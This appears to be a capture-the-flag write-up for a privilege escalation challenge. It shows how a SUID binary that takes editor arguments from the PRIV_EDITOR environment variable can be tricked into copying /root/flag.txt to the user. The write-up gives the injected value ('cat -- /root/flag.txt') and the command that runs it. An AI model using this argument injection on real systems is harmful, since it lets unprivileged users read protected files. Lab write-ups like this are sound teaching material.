# Writeup: PrivExec Challenge (Privilege Escalation)

## 1. Challenge Description

The goal of this challenge is to read the flag file located at:

```
/root/flag.txt
```

The challenge provides:

* A **SUID binary** called `privexec`
* The **source code** of the binary

---

## 2. Analysis

After inspecting the provided files, we found the following:

* **`bin/privexec`**
  This binary has the **SUID bit set**, meaning it executes with **root privileges**.

* **`privexec.conf`**
  Inside this configuration file, we found the following entry:

  ```
  ttyduser:*:edit:/tmp/test.test:nopass
  ```

  This means that the user `ttyduser` is allowed to **edit `/tmp/test.test` as root without a password**.

* **Source Code (`source_code/src/editor.c`)**
  While reviewing the source code, we discovered that the program uses an **environment variable** called `PRIV_EDITOR` to determine which editor is used to open files.

  The vulnerable part of the code is shown below:

  ```c
  int dash_index = -1;
  for (int i = 0; i < editor_argc; i++) {
      if (strcmp(editor_argv[i], "--") == 0) {
          dash_index = i;
          break;
      }
  }

  // ...

  if (dash_index != -1) {
      for (int i = dash_index + 1; i < editor_argc && editor_argv[i]; i++) {
          files_to_edit[num_files] = strdup(editor_argv[i]);
          num_files++;
      }
  }
  ```

### What’s the problem?

Anything placed **after `--` in the `PRIV_EDITOR` variable** is treated as an **additional file to edit**, without proper validation.

---

## 3. The Vulnerability (Argument Injection)

Since the program runs as **root**, it performs the following steps:

1. Reads the requested files **with root privileges**
2. Copies them into `/tmp`
3. Changes ownership of the copied files to the current user (`ttyduser`)
4. Launches the editor specified by `PRIV_EDITOR`

Because of the argument injection issue, we can **inject the path to `/root/flag.txt`** as an extra file to edit.

---

## 4. Exploitation Steps

### Step 1: Prepare the Environment

We set `PRIV_EDITOR` to `cat` instead of a real editor, and inject the flag file path after `--`:

```bash
export PRIV_EDITOR="cat -- /root/flag.txt"
```

### Step 2: Run the Program

We execute the SUID binary and request to edit the allowed file:

```bash
./bin/privexec -e /tmp/test.test
```

---

## 5. Result

The program:

* Accepts `/tmp/test.test` as the allowed file
* Also processes `/root/flag.txt` due to the injected argument
* Copies the flag file
* Changes its ownership to our user
* Executes `cat` on it

### 🎉 The flag is printed directly to the screen:

```
Flag{QCFAYURNaVN2Y0VhcWFPMXdRakMzaTNzOHUyZlRWY0ZYcVczRDFhM252cGNVST1kMmQxMmEwOGE4YTc2ZGU4}
```
